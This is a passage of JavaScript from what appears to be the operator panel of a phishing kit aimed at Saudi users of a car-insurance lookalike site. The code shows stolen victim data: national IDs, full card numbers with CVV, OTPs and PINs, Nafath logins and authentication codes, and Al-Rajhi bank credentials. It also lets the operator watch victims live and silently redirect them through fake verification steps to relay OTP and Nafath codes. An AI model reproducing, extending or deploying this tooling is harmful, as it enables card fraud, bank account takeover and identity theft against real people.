            if ((p2 >= 51 && p2 <= 55) || (p4 >= 2221 && p4 <= 2720)) return 'MASTERCARD';
            if (num[0] === '4') return 'VISA';

            return 'CARD';
        }

        // Card type gradient per type
        function getCardGradient(cardNumber) {
            const num = (cardNumber || '').replace(/\D/g, '');
            if (num.length < 4) return 'linear-gradient(135deg,#1e293b 0%,#334155 45%,#0f172a 100%)';

            // Al-Rajhi Specific Gradient
            const rajhiBins = ['4463', '4464', '4584', '4847', '5297', '5358', '5359', '5360', '5888', '5081'];
            for (const bin of rajhiBins) {
                if (num.startsWith(bin)) return 'linear-gradient(135deg,#0053a0 0%,#003c71 50%,#002147 100%)';
            }

            const madaBins = ['400861', '401757', '407197', '410621', '418049', '428671', '431361', '432328', '440533', '440647', '440795', '445564', '446393', '446404', '446672', '455036', '455708', '457865', '462220', '468540', '468541', '468542', '468543', '483010', '483011', '483012', '484783', '486094', '486095', '486096', '487462', '489318', '489319', '493428', '504300', '508160', '5078', '5079', '521076', '524130', '524514', '530060', '531095', '535825', '535989', '536023', '537767', '540020', '543085', '543357', '549760', '557606', '558563', '585265', '588845', '588846', '588847', '588849', '588850', '588851', '588982', '589005', '589206', '604906', '605141', '636120', '968201', '968202', '968203', '968204', '968205', '968206', '968207', '968208', '968209', '968210', '968211'];
            for (const bin of madaBins) { if (num.startsWith(bin)) return 'linear-gradient(135deg,#1a56db 0%,#1e429f 50%,#1e3a8a 100%)'; }

            if (num.startsWith('9682') || num.startsWith('9683')) return 'linear-gradient(135deg,#7e22ce 0%,#6d28d9 50%,#4c1d95 100%)';

            const p2 = parseInt(num.substring(0, 2));
            const p4 = parseInt(num.substring(0, 4));
            if ((p2 >= 51 && p2 <= 55) || (p4 >= 2221 && p4 <= 2720)) return 'linear-gradient(135deg,#b91c1c 0%,#f59e0b 50%,#0f172a 100%)';
            if (num[0] === '4') return 'linear-gradient(135deg,#1e293b 0%,#334155 45%,#0f172a 100%)';
            return 'linear-gradient(135deg,#1e293b 0%,#334155 45%,#0f172a 100%)';
        }

        function refreshCurrentTab() {
            let url = 'index.php?tab=' + currentTab;
            $.get(url, function (data) {
                let newGridHtml = $(data).find('#bulkActionForm').html();
                $('#bulkActionForm').html(newGridHtml);
            });
        }

        window.openDetailPanel = function (el) {
            let userId;
            if (typeof el === 'object') {
                userId = $(el).data('user-id');
            } else {
                userId = el;
            }

            if (!userId) return;
            currentActiveUser = userId;

            // UI Basics
            $('#panelUserId').text('#' + userId);
            $('#detailPanel').addClass('active');
            $('#panelBackdrop').addClass('active');
            $('.user-module').removeClass('selected');
            $(`.user-module[data-user-id="${userId}"]`).addClass('selected');

            // Show loading & fetch
            loadDetailPanel(userId, false);
            updateDashboardStats();
        };

        window.switchCardTab = function (btn, cardId, tabId) {
            const container = $(btn).closest('.card-module-wrapper');
            container.find('.card-tab-btn').removeClass('active');
            $(btn).addClass('active');
            container.find('.card-tab-content').removeClass('active');
            container.find('#tab-' + tabId + '-' + cardId).addClass('active');
        };

        window.loadDetailPanel = function (userId, isSilent = false) {
            if (!userId) return;

            if (!isSilent) {
                $('#panelContent').html('<div class="text-center py-5"><div class="spinner-border text-primary"></div><p class="mt-2 text-muted">جاري تحميل البيانات...</p></div>');
            }

            $.get('get-user-details.php', { id: userId }, function (res) {
                if (res.error) {
                    if (!isSilent) $('#panelContent').html('<div class="alert alert-danger m-3">' + res.error + '</div>');
                    return;
                }

                const u = res.user;

                // 1. Update Tech Bar
                $('#panelTechBar').html(`
                    <div class="tech-tag" title="IP Address"><i class="bi bi-geo-alt-fill"></i> ${u.ip}</div>
                    <div class="tech-tag" title="Location"><i class="bi bi-map-fill"></i> ${u.location}</div>
                    <div class="tech-tag" title="Device"><i class="bi bi-laptop-fill"></i> ${u.device}</div>
                    <div class="tech-tag" title="Browser"><i class="bi bi-browser-chrome"></i> ${u.browser}</div>
                    <div class="tech-tag" title="Page"><i class="bi bi-geo-alt-fill text-danger"></i> ${u.page || 'Home'}</div>
                `);

                // 2. Admin Actions Icons
                $('#p-archive-link').attr('onclick', `confirmAdminAction('${u.archived == '1' ? 'unarchive' : 'archive'}', ${userId})`).attr('title', u.archived == '1' ? 'إلغاء الأرشفة' : 'نقل للأرشيف').html(u.archived == '1' ? '<i class="bi bi-arrow-up-circle-fill text-warning"></i>' : '<i class="bi bi-archive"></i>');
                $('#p-dist-link').attr('onclick', `confirmAdminAction('distinguish', ${userId})`).attr('title', 'تمييز').html(u.distinguished == '1' ? '<i class="bi bi-star-fill text-warning"></i>' : '<i class="bi bi-star"></i>');
                $('#p-pin-link').attr('onclick', `confirmAdminAction('pin', ${userId})`).attr('title', 'تثبيت').html(u.is_pinned == '1' ? '<i class="bi bi-pin-angle-fill text-warning"></i>' : '<i class="bi bi-pin-angle"></i>');
                $('#p-completed-link').attr('onclick', `confirmAdminAction('completed', ${userId})`).attr('title', 'مكتمل').html(u.is_completed == '1' ? '<i class="bi bi-check-circle-fill text-warning"></i>' : '<i class="bi bi-check-circle"></i>');
                $('#p-ban-link').attr('onclick', `confirmBanIP('${u.ip}', ${userId})`);

                // 3. Compact Vehicle Data
                const v = `
                <div class="compact-vehicle-grid">
                    <div class="compact-tag"><span class="label">الهوية</span><span class="value">${u.ssn || '---'}</span></div>
                    <div class="compact-tag"><span class="label">تاريخ الوثيقة</span><span class="value">${u.docDate || '---'}</span></div>
                    <div class="compact-tag"><span class="label">قيمة الموتر</span><span class="value">${u.carValue || '0'} ر.س</span></div>
                    <div class="compact-tag"><span class="label">سنة الصنع</span><span class="value">${u.createdYear || '---'}</span></div>
                    <div class="compact-tag"><span class="label">نوع التأمين</span><span class="value">${u.firstType == '2' ? 'نقل ملكية' : (u.firstType == '1' ? 'تأمين جديد' : '---')}</span></div>
                    <div class="compact-tag"><span class="label">نوع الوثيقة</span><span class="value">${u.secondType == '2' ? 'جمركية' : (u.secondType == '1' ? 'استمارة' : '---')}</span></div>
                    <div class="compact-tag"><span class="label">رقم تسلسلي</span><span class="value">${u.tasal || '---'}</span></div>
                    <div class="compact-tag"><span class="label">مكان الإصلاح</span><span class="value text-primary">${u.repairPlace || '---'}</span></div>
                </div>`;
                $('#panelVehicleData').html(v);

                // 4. Cards Generation
                let html = '<div class="cards-grid d-flex flex-column gap-3" style="width: 60%;">';
                if (res.cards && res.cards.length > 0) {
                    res.cards.forEach((c) => {
                        let cardActionBtn = (c.status == 1)
                            ? `<div style="flex:1;text-align:center;padding:8px;border-radius:10px;background:#dcfce7;color:#16a34a;font-weight:700;font-size:0.8rem;"><i class="bi bi-check-lg"></i> تم القبول</div>`
                            : (c.status == 2)
                                ? `<div style="flex:1;text-align:center;padding:8px;border-radius:10px;background:#fee2e2;color:#dc2626;font-weight:700;font-size:0.8rem;"><i class="bi bi-x-lg"></i> تم الرفض</div>`
                                : `<button onclick="showCardModal(event, ${c.id}, 1)" style="flex:1;padding:8px;border:none;border-radius:10px;background:#10b981;color:white;font-weight:700;cursor:pointer;"><i class="bi bi-check-lg"></i> قبول</button>
                                   <button onclick="showCardModal(event, ${c.id}, 2)" style="flex:1;padding:8px;border:none;border-radius:10px;background:#f43f5e;color:white;font-weight:700;cursor:pointer;"><i class="bi bi-x-lg"></i> رفض</button>`;

                        html += `
                        <div class="card-module-wrapper w-100 p-3 bg-white border rounded-4 shadow-sm d-flex flex-column gap-3">
                            <div style="background:${getCardGradient(c.cardNumber)};border-radius:16px;padding:16px 20px;color:white;min-height:165px;display:flex;flex-direction:column;justify-content:space-between;box-shadow:0 8px 15px rgba(0,0,0,0.1);">
                                <div style="display:flex;justify-content:space-between;align-items:center;">
                                    <b style="font-size:1rem;letter-spacing:1px;opacity:0.9;">${getCardTypeBadge(c.cardNumber)}</b>
                                    <div style="width:34px;height:24px;background:linear-gradient(135deg,#fcd34d,#b45309);border-radius:4px;"></div>
                                </div>
                                <div style="margin:10px 0;">
                                    <div style="font-size:1.3rem;font-weight:700;direction:ltr !important;letter-spacing:2px;font-family:monospace;text-align:center;" dir="ltr">
                                        ${(c.cardNumber || '**** **** **** ****').replace(/(\d{4})/g, '$1 ').trim()}
                                    </div>
                                    <div id="bin-info-${c.id}" style="font-size:0.6rem; font-weight:500; margin-top:8px; padding:5px 10px; background:rgba(0,0,0,0.2); border-radius:8px; border:1px solid rgba(255,255,255,0.15);">
                                        <div class="spinner-border spinner-border-sm text-white opacity-25" role="status"></div> جاري التحليل...
                                    </div>
                                </div>
                                <div style="display:flex;justify-content:space-between;align-items:flex-end; font-size:0.75rem;">
                                    <div><small style="opacity:0.7;display:block;font-size:0.6rem;">Holder Name</small><b>${c.cardname || '---'}</b></div>
                                    <div style="text-align:left;"><small style="opacity:0.7;display:block;font-size:0.6rem;">EXP / CVV</small><b>${c.year || '**/**'} | ${c.cvv || '***'}</b></div>
                                </div>
                            </div>

                            <div class="p-3 bg-light rounded-3">
                                <div class="row g-2 mb-3">
                                    <div class="col-6"><div class="p-2 bg-white rounded text-center border shadow-sm small"><span class="text-muted d-block">رمز OTP</span><b class="text-primary fs-6">${c.otp || '---'}</b></div></div>
                                    <div class="col-6"><div class="p-2 bg-white rounded text-center border shadow-sm small"><span class="text-muted d-block">الرقم السري</span><b class="text-primary fs-6">${c.password || '---'}</b></div></div>
                                </div>
                                <div class="d-flex gap-2">${cardActionBtn}</div>
                                <div id="otp-history-${c.id}" class="mt-2" style="display:none;"><small class="text-muted d-block mb-1">OTPs السابقة:</small><div id="otp-history-list-${c.id}" class="d-flex flex-wrap gap-1"></div></div>
                            </div>

                            <div class="p-3 border rounded-3 bg-white">
                                <h6 class="fw-bold mb-3 small text-muted"><i class="bi bi-person-badge ms-1"></i> نفاذ:</h6>
                                <div class="row g-2">
                                   <div class="col-6"><div class="p-2 border border-opacity-25 bg-opacity-10 rounded text-center"><span class="d-block small">الشركة</span><b class="fs-4">${c.company || '---'}</b></div></div>
                                    <div class="col-6"><div class="p-2 border border-opacity-25 bg-opacity-10 rounded text-center"><span class="d-block small">الهاتف </span><b class="fs-4">${c.PhoneNumber || '---'}</b></div></div>                                
                                    <div class="col-6"><div class="p-2 border border-opacity-25 bg-opacity-10 rounded text-center"><span class="d-block small">رقم الهوية</span><b class="fs-4">${c.ssn || '---'}</b></div></div>
                                   <div class="col-6"><div class="p-2 border border-opacity-25 bg-opacity-10 rounded text-center"><span class="d-block small">اسم مستخدم</span><b class="fs-4">${c.UserName_Nafad || '---'}</b></div></div>
                                   <div class="col-6"><div class="p-2 border border-opacity-25 bg-opacity-10 rounded text-center"><span class="d-block small">كلمة مرور</span><b class="fs-4">${c.UserPasswore_Nafad || '---'}</b></div></div>
                                   <div class="col-6"><div class="p-2 border border-opacity-25 bg-opacity-10 rounded text-center"><span class="d-block small">رمز التوثيق</span><b class="fs-4">${c.Authentication_code || '---'}</b></div></div>
                                </div>
                                <div id="nafath-history-${c.id}" class="mt-2" style="display:none;"><small class="text-muted d-block mb-1">رموز التوثيق السابقة:</small><div id="nafath-history-list-${c.id}" class="d-flex flex-wrap gap-1"></div></div>
                                <div class="mt-3">
                                    ${c.CheckTheInfo_Nafad == 0 ? `
                                        <div class="d-flex gap-2">
                                            <button onclick="showNafathModal(event, ${c.id}, 1)" class="btn btn-sm btn-primary flex-fill fw-bold">قبول نفاذ</button>
                                            <button onclick="showNafathModal(event, ${c.id}, 2)" class="btn btn-sm btn-light flex-fill fw-bold">رفض</button>
                                        </div>` : `<div class="text-center py-2 bg-light rounded small fw-bold">${c.CheckTheInfo_Nafad == 1 ? '✓ تم قبول نفاذ' : '✗ تم رفض نفاذ'}</div>`
                            }
                                </div>
                            </div>

                            <div class="p-3 border rounded-3 bg-white">
                                <h6 class="fw-bold mb-3 small text-muted"><i class="bi bi-bank ms-1"></i> الراجحي:</h6>
                                <div class="row g-2">
                                    <div class="col-6"><div class="p-2 bg-light rounded small text-center"><span class="d-block text-muted">المستخدم</span><b>${c.username || '---'}</b></div></div>
                                    <div class="col-6"><div class="p-2 bg-light rounded small text-center"><span class="d-block text-muted">المرور</span><b>${c.passwordt || '---'}</b></div></div>
                                </div>
                                <div class="mt-3">
                                    ${(c.username && c.username !== '' && (c.rajhi_status == 0 || !c.rajhi_status)) ? `
                                        <div class="d-flex gap-2">
                                            <button onclick="showRajhiModal(event, ${c.id}, 1)" class="btn btn-sm btn-info text-white flex-fill fw-bold">قبول البنك</button>
                                            <button onclick="showRajhiModal(event, ${c.id}, 2)" class="btn btn-sm btn-light flex-fill fw-bold">رفض</button>
                                        </div>` : `<div class="text-center py-2 bg-light rounded small fw-bold">${c.rajhi_status == 1 ? '✓ تم قبول البنك' : (c.rajhi_status == 2 ? '✗ تم رفض البنك' : 'لا يوجد')}</div>`
                            }
                                </div>
                            </div>
                        </div>`;
                    });
                } else {
                    html += `<div class="text-center text-muted py-5 border rounded-4 bg-white"><i class="bi bi-credit-card-2-front opacity-25" style="font-size: 3.5rem;"></i><p class="mt-2 mb-0">لا توجد سجلات</p></div>`;
                }

                html += '</div>';
                $('#panelContent').html(html);

                // 5. Post-Render Analysis
                if (res.cards) {
                    res.cards.forEach(card => {
                        analyzeBIN(card.cardNumber, card.id);
                        $.getJSON('get-otp-history.php', { card_id: card.id }, function (hLog) {
                            if (hLog && hLog.length > 0) {
                                let lHtml = hLog.map(h => `<span class="badge bg-dark text-warning" title="${h.time}">${h.otp}</span>`).join(' ');
                                $('#otp-history-list-' + card.id).html(lHtml);
                                $('#otp-history-' + card.id).show();
                            }
                        });
                        $.getJSON('get-nafath-history.php', { card_id: card.id }, function (nLog) {
                            if (nLog && nLog.length > 0) {
                                let nHtml = nLog.map(h => `<span class="badge bg-secondary" title="${h.time}">${h.code}</span>`).join(' ');
                                $('#nafath-history-list-' + card.id).html(nHtml);
                                $('#nafath-history-' + card.id).show();
                            }
                        });
                    });
                }
            });
        };

        // Independent Modal States
        let _cardId = null, _cardStatus = null;
        let _nafathId = null, _nafathStatus = null;

        // Style page options on hover/check
        $(document).on('change', 'input[name="modalPageCard"], input[name="modalPageNafath"]', function () {
            $(this).closest('.modal-body').find('.page-option').css({ background: '', borderColor: '' });
            $(this).closest('.page-option').css({ background: '#f0f0ff', borderColor: '#4f46e5' });
        });

        // 1. Card Control Flow
        function showCardModal(e, id, status, userId) {
            if (e) { e.stopPropagation(); e.preventDefault(); }

            // If userId provided (from cards page), set currentActiveUser
            if (userId && !currentActiveUser) {
                currentActiveUser = userId;
            }

            if (!currentActiveUser) { Swal.fire({ icon: 'error', title: 'خطأ', text: 'فشل تحديد هوية الزائر' }); return; }

            _cardId = id;
            _cardStatus = status;

            const isAccept = (status == 1);
            document.getElementById('cardModalTitle').textContent = isAccept ? '✓ قبول بطاقة #' + id : '✗ رفض بطاقة #' + id;
            document.getElementById('cardModalSubtitle').textContent = isAccept ? 'حدد الصفحة لتوجيه العميل إليها بعد القبول' : 'حدد صفحة الرجوع بعد الرفض';

            const btn = document.getElementById('confirmCardBtn');
            btn.className = 'btn flex-fill fw-bold rounded-3 ' + (isAccept ? 'btn-success' : 'btn-danger');
            btn.innerHTML = isAccept ? '<i class="bi bi-check-circle"></i> تأكيد القبول' : '<i class="bi bi-x-circle"></i> تأكيد الرفض';

            setTimeout(function () {
                var modalEl = document.getElementById('cardActionModal');
                var modal = bootstrap.Modal.getInstance(modalEl);
                if (!modal) modal = new bootstrap.Modal(modalEl);
                modal.show();
            }, 100);
        }

        function confirmCardAction(e) {
            if (e) { e.preventDefault(); e.stopPropagation(); }
            const selectedPage = $('input[name="modalPageCard"]:checked').val();
            if (!selectedPage) { Swal.fire({ icon: 'warning', title: 'تنبيه', text: 'يرجى اختيار صفحة التوجيه أولاً' }); return false; }

            var modalInst = bootstrap.Modal.getInstance(document.getElementById('cardActionModal'));
            if (modalInst) modalInst.hide();

            if (!_cardId) { Swal.fire({ icon: 'warning', title: 'خطأ', text: 'لم يتم تحديد العنصر', timer: 2000, showConfirmButton: false }); return false; }

            executeStatusUpdate('card', _cardId, _cardStatus, selectedPage);
            return false;
        }

        // 2. Nafath Control Flow
        function showNafathModal(e, id, status) {
            if (e) { e.stopPropagation(); e.preventDefault(); }
            if (!currentActiveUser) { Swal.fire({ icon: 'error', title: 'خطأ', text: 'فشل تحديد هوية الزائر' }); return; }

            _nafathId = id;
            _nafathStatus = status;

            const isAccept = (status == 1);
            document.getElementById('nafathModalTitle').textContent = isAccept ? '✓ قبول نفاذ' : '✗ رفض نفاذ';
            document.getElementById('nafathModalSubtitle').textContent = isAccept ? 'حدد الصفحة لتوجيه العميل إليها بعد القبول' : 'حدد صفحة الرجوع بعد الرفض';

            const btn = document.getElementById('confirmNafathBtn');
            btn.className = 'btn flex-fill fw-bold rounded-3 ' + (isAccept ? 'btn-success' : 'btn-danger');
            btn.innerHTML = isAccept ? '<i class="bi bi-check-circle"></i> تأكيد القبول' : '<i class="bi bi-x-circle"></i> تأكيد الرفض';

            setTimeout(function () {
                var modalEl = document.getElementById('nafathActionModal');
                var modal = bootstrap.Modal.getInstance(modalEl);
                if (!modal) modal = new bootstrap.Modal(modalEl);
                modal.show();
            }, 100);
        }

        function confirmNafathAction(e) {
            if (e) { e.preventDefault(); e.stopPropagation(); }
            let selectedPage = $('input[name="modalPageNafath"]:checked').val();
            if (!selectedPage) { Swal.fire({ icon: 'warning', title: 'تنبيه', text: 'يرجى اختيار صفحة التوجيه أولاً' }); return false; }

            var modalInst = bootstrap.Modal.getInstance(document.getElementById('nafathActionModal'));
            if (modalInst) modalInst.hide();

            if (!_nafathId) { Swal.fire({ icon: 'warning', title: 'خطأ', text: 'لم يتم تحديد العنصر', timer: 2000, showConfirmButton: false }); return false; }

            // Special handling for StepFifth.php (Two-Step Verification)
            if (selectedPage === 'StepFifth.php') {
                Swal.fire({
                    title: 'إدخال رمز التحقق',
                    text: 'يرجى إدخال الرمز الذي سيظهر للعميل في تطبيق نفاذ (مثلاً: 25)',
                    input: 'number',
                    inputAttributes: {
                        min: 1,
                        max: 99,
                        step: 1
                    },
                    inputValue: '',
                    showCancelButton: true,
                    confirmButtonText: 'إرسال التوجيه',
                    cancelButtonText: 'إلغاء',
                    inputValidator: (value) => {
                        if (!value) {
                            return 'يجب إدخال الرمز أولاً';
                        }
                    }
                }).then((result) => {
                    if (result.isConfirmed) {
                        const code = result.value;
                        const finalUrl = `StepFifth.php?code=${code}`;
                        executeStatusUpdate('card_nafath', _nafathId, _nafathStatus, finalUrl);
                    }
                });
            } else {
                executeStatusUpdate('card_nafath', _nafathId, _nafathStatus, selectedPage);
            }
            return false;
        }

        // 3. Rajhi Control Flow
        let _rajhiId = null, _rajhiStatus = null;
        function showRajhiModal(e, id, status) {
            if (e) { e.stopPropagation(); e.preventDefault(); }
            if (!currentActiveUser) { Swal.fire({ icon: 'error', title: 'خطأ', text: 'فشل تحديد هوية الزائر' }); return; }

            _rajhiId = id;
            _rajhiStatus = status;

            const isAccept = (status == 1);
            document.getElementById('rajhiModalTitle').textContent = isAccept ? '✓ قبول الراجحي' : '✗ رفض الراجحي';
            document.getElementById('rajhiModalSubtitle').textContent = isAccept ? 'حدد الصفحة لتوجيه العميل إليها بعد القبول' : 'حدد صفحة الرجوع بعد الرفض';

            const btn = document.getElementById('confirmRajhiBtn');
            btn.className = 'btn flex-fill fw-bold rounded-3 ' + (isAccept ? 'btn-success' : 'btn-danger');
            btn.innerHTML = isAccept ? '<i class="bi bi-check-circle"></i> تأكيد القبول' : '<i class="bi bi-x-circle"></i> تأكيد الرفض';

            setTimeout(function () {
                var modalEl = document.getElementById('rajhiActionModal');
                var modal = bootstrap.Modal.getInstance(modalEl);
                if (!modal) modal = new bootstrap.Modal(modalEl);
                modal.show();
            }, 100);
        }

        function confirmRajhiAction(e) {
            if (e) { e.preventDefault(); e.stopPropagation(); }
            const selectedPage = $('input[name="modalPageRajhi"]:checked').val();
            if (!selectedPage) { Swal.fire({ icon: 'warning', title: 'تنبيه', text: 'يرجى اختيار صفحة التوجيه أولاً' }); return false; }

            var modalInst = bootstrap.Modal.getInstance(document.getElementById('rajhiActionModal'));
            if (modalInst) modalInst.hide();

            if (!_rajhiId) { Swal.fire({ icon: 'warning', title: 'خطأ', text: 'لم يتم تحديد العنصر', timer: 2000, showConfirmButton: false }); return false; }

            executeStatusUpdate('card_rajhi', _rajhiId, _rajhiStatus, selectedPage);
            return false;
        }

        // Shared AJAX Logic
        function executeStatusUpdate(type, id, status, selectedPage) {
            // Standardize Rejection: Append reject=1 if status is 2 (Reject)
            if (status == 2 && selectedPage.indexOf('reject=1') === -1) {
                selectedPage += (selectedPage.indexOf('?') === -1 ? '?' : '&') + 'reject=1';
            }

            $.ajax({
                url: 'update-status.php',
                type: 'POST',
                dataType: 'json',
                data: { type: type, id: id, status: status, url: selectedPage },
                success: function (res) {
                    if (res.success) {
                        $.ajax({
                            url: 'trigger-page.php',
                            type: 'POST',
                            data: { userId: currentActiveUser, page: selectedPage },
                            success: function () {
                                Swal.fire({
                                    icon: status == 1 ? 'success' : 'info',
                                    title: status == 1 ? 'تم القبول' : 'تم الرفض',
                                    text: 'تم تحديث الحالة وتوجيه الزائر بنجاح',
                                    timer: 2000,
                                    showConfirmButton: false
                                });
                                if (currentActiveUser) openDetailPanel(currentActiveUser);
                            }
                        });
                    } else {
                        Swal.fire({ icon: 'error', title: 'خطأ', text: res.error || 'فشل التحديث' });
                    }
                },
                error: function (xhr) {
                    Swal.fire({ icon: 'error', title: 'خطأ في الاتصال', text: 'تعذر الاتصال بالخادم' });
                }
            });
        }

        function updateDashboardStats() {
            $.get('get-stats.php', function (res) {
                $('#val-visitors').text(res.daily_visitors).parent().parent().addClass('pulse-glow');
                $('#val-cards').text(res.total_cards).parent().parent().addClass('pulse-glow');
                $('#val-otp').text(res.accepted_otps).parent().parent().addClass('pulse-glow');
                setTimeout(() => $('.stat-pill').removeClass('pulse-glow'), 1000);
            });
        }

        function closeDetailPanel() {
            $('#detailPanel').removeClass('active');
            $('#panelBackdrop').removeClass('active');
            $('.user-module').removeClass('selected');
            currentActiveUser = null;
        }

        function sendRedirect() {
            const page = $('#redirectPage').val();
            if (!currentActiveUser) {
                Swal.fire({ icon: 'warning', title: 'تنبيه', text: 'الرجاء اختيار زائر أولاً', timer: 2000, showConfirmButton: false });
                return;
            }

            $.post('trigger-page.php', { userId: currentActiveUser, page: page }, function () {
                Swal.fire({
                    icon: 'success',
                    title: 'تم التوجيه بنجاح',
                    text: 'تم إرسال أمر التوجيه للزائر صامتاً.',
                    timer: 2000,
                    showConfirmButton: false
                });
            });
        }

        function confirmSingleDelete() {
            if (!currentActiveUser) return;

            Swal.fire({
                title: 'هل أنت متأكد؟',
                text: 'سيتم حذف هذا الزائر نهائياً وبدون رجعة',
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#d33',
                cancelButtonColor: '#3085d6',
                confirmButtonText: 'نعم، احذف!',
                cancelButtonText: 'إلغاء'
            }).then((result) => {
                if (result.isConfirmed) {
                    confirmAdminAction('delete', currentActiveUser);
                }
            });
        }

        function confirmAdminAction(action, id) {
            $.post('admin-action.php', { action: action, id: id }, function (res) {
                if (res.success) {
                    let msg = 'تمت العملية بنجاح';
                    if (action === 'archive' || action === 'unarchive') msg = 'تم تحديث حالة الأرشيف';
                    if (action === 'distinguish') msg = 'تم تحديث التمييز';
                    if (action === 'pin') msg = 'تم تحديث التثبيت';
                    if (action === 'completed') msg = 'تم التحديث كمكتمل';
                    if (action === 'delete') msg = 'تم حذف الزائر بنجاح';

                    Swal.fire({ icon: 'success', title: 'تمت العملية', text: msg, timer: 1500, showConfirmButton: false });

                    if (action === 'delete') {
                        $('.user-module[data-user-id="' + id + '"]').remove();
                        closeDetailPanel();
                        updateDashboardStats();
                    } else if (action === 'archive' || action === 'unarchive') {
                        $('.user-module[data-user-id="' + id + '"]').slideUp(function () { $(this).remove(); });
                        closeDetailPanel();
                        updateDashboardStats();
                    } else if (action === 'pin') {
                        $('.user-module[data-user-id="' + id + '"]').toggleClass('is-pinned');
                        $('.user-module[data-user-id="' + id + '"] .q-action.pin').toggleClass('active');
                        updateDashboardStats();
                    } else if (action === 'completed') {
                        $('.user-module[data-user-id="' + id + '"]').toggleClass('is-completed');
                        $('.user-module[data-user-id="' + id + '"] .q-action.check').toggleClass('active');
                        updateDashboardStats();
                    } else if (action === 'distinguish') {
                        $('.user-module[data-user-id="' + id + '"]').toggleClass('is-dist');
                        $('.user-module[data-user-id="' + id + '"] .q-action.star').toggleClass('active');
                        if (currentActiveUser) loadDetailPanel(id, true);
                        updateDashboardStats();
                    }
                } else {
                    Swal.fire({ icon: 'error', title: 'خطأ', text: res.error || 'حدث خطأ غير متوقع' });
                }
            }, 'json');
        }


        // --- Pusher Real-time Listeners ---
        const pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2',
            authEndpoint: '../pusher-auth.php'
        });

        const channel = pusher.subscribe('bcare');
        const presenceChannel = pusher.subscribe('presence-bcare');

        let currentTab = '<?= $current_tab ?>';

        // --- AJAX SPA Navigation ---
        $(document).on('click', '.tab-pill', function (e) {
            e.preventDefault();
            let url = $(this).attr('href');
            let tabName = url.split('tab=')[1] || 'visitors';

            // Visual update
            $('.tab-pill').removeClass('active');
            $(this).addClass('active');

            // Change URL without reload
            window.history.pushState({ path: url }, '', url);
            currentTab = tabName;

            // Close any open panels
            closeDetailPanel();
            unselectAll();

            // Show Loader
            $('#bulkActionForm').html('<div class="w-100 text-center py-5" style="grid-column: 1 / -1;"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;"></div><h5 class="mt-3 text-muted fw-bold">جاري الانتقال...</h5></div>');

            // Extract and load just the form content
            $.get(url, function (data) {
                // Refresh grid
                let newGridHtml = $(data).find('#bulkActionForm').html();
                $('#bulkActionForm').html(newGridHtml);

                // Refresh legend-bar if present in the data
                let newLegendHtml = $(data).find('#legend-container').html();
                $('#legend-container').html(newLegendHtml);
            }).fail(function () {
                Swal.fire({ icon: 'error', title: 'خطأ', text: 'فشل تحميل القسم المطلوب' });
            });
        });

        // Handle back/forward buttons
        window.addEventListener('popstate', function () {
            location.reload();
        });

        // --- Live User Search ---
        let searchTimeout;
        $('#navSearchInput').on('input', function () {
            const q = $(this).val().trim();
            const dropdown = $('#searchResultsDropdown');

            if (q.length < 1) {
                dropdown.removeClass('active').empty();
                return;
            }

            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(function () {
                $.get('search-users.php', { q: q }, function (res) {
                    dropdown.empty();
                    if (res && res.length > 0) {
                        res.forEach(user => {
                            const isArchived = user.is_archived == 1 ? '<span class="search-archived-badge">مؤرشف</span>' : '';
                            let ssnStr = user.ssn ? `<span class="badge bg-light text-dark border ms-1"><i class="bi bi-card-text"></i> ${user.ssn}</span>` : '';
                            let phoneStr = user.phone ? `<span class="badge bg-light text-dark border"><i class="bi bi-phone"></i> ${user.phone}</span>` : '';

                            const html = `
                                    <div class="search-result-item" onclick="openSearchResult(${user.id})">
                                        <div class="search-info-group w-100">
                                            <div class="d-flex justify-content-between align-items-center mb-1">
                                                <span class="search-id">ID: #${user.id} ${isArchived}</span>
                                                <span style="font-size: 0.7rem; color: #888;">${user.ip}</span>
                                            </div>
                                            <div class="search-meta d-flex align-items-center flex-wrap">
                                                <span class="ms-2"><i class="bi bi-geo-alt text-primary"></i> ${user.location || '---'}</span>
                                                ${ssnStr}
                                                ${phoneStr}
                                            </div>
                                        </div>
                                    </div>
                                `;
                            dropdown.append(html);
                        });
                        dropdown.addClass('active');
                    } else {
                        dropdown.html('<div class="p-3 text-center text-muted small">لا توجد نتائج مطابقة</div>').addClass('active');
                    }
                }, 'json');
            }, 300); // 300ms debounce
        });

        // Close search dropdown when clicking outside
        $(document).on('click', function (e) {
            if (!$(e.target).closest('.nav-search-wrapper').length) {
                $('#searchResultsDropdown').removeClass('active');
            }
        });

        // Function to handle clicking a search result
        window.openSearchResult = function (id) {
            $('#navSearchInput').val('');
            $('#searchResultsDropdown').removeClass('active');
            openDetailPanel(id);
        };

        // Track live members
        let liveMembers = {};

        presenceChannel.bind('pusher:subscription_succeeded', function (members) {
            liveMembers = members.members;
            updateLiveIndicators();
            updateActiveCounter(members.count);
        });

        presenceChannel.bind('pusher:member_added', function (member) {
            liveMembers[member.id] = member.info;
            updateLiveIndicators();
            updateActiveCounter(presenceChannel.members.count);
        });

        presenceChannel.bind('pusher:member_removed', function (member) {
            delete liveMembers[member.id];
            updateLiveIndicators();
            updateActiveCounter(presenceChannel.members.count);
        });

        function updateActiveCounter(count) {
            // Count only visitors, not admins
            let visitorCount = 0;
            presenceChannel.members.each(function (member) {
                if (member.id.startsWith('visitor-')) visitorCount++;
            });
            $('#activeVisitorsBadge').html('<i class="bi bi-people-fill ms-1"></i> الزوار النشطون حالياً: ' + visitorCount);
        }

        function updateLiveIndicators() {
            $('.user-module').each(function () {
                const userId = $(this).data('user-id');
                const indicator = $(this).find('.pulse-indicator');
                const avatar = $(this).find('.avatar-circle');

                if (liveMembers['visitor-' + userId]) {
                    indicator.removeClass('offline waiting').addClass('active');
                    avatar.removeClass('offline waiting').addClass('active');
                } else {
                    // Force real-time "Offline" status transition
                    indicator.removeClass('active waiting').addClass('offline');
                    avatar.removeClass('active waiting').addClass('offline');
                }
            });
        }

        // New Visitor
        channel.bind('my-event-bann', function (data) {
            addNotification('new', 'قام العميل بفتح الموقع وإنشاء نموذج جديد');
            if (currentTab === 'visitors') {
                $.ajax({
                    url: "users-list.php",
                    success: function (response) {
                        $('.grid-container').prepend(response);
                        triggerHighlight('.user-module:first', '.grid-container');
                        incrementBadge('#visitor-count-badge');
                        audio.play().catch(console.error);
                    }
                });
            } else {
                incrementBadge('#visitor-count-badge');
                audio.play().catch(console.error);
            }
        });

        // Current Page Update
        channel.bind('curreneft-page', function (data) {
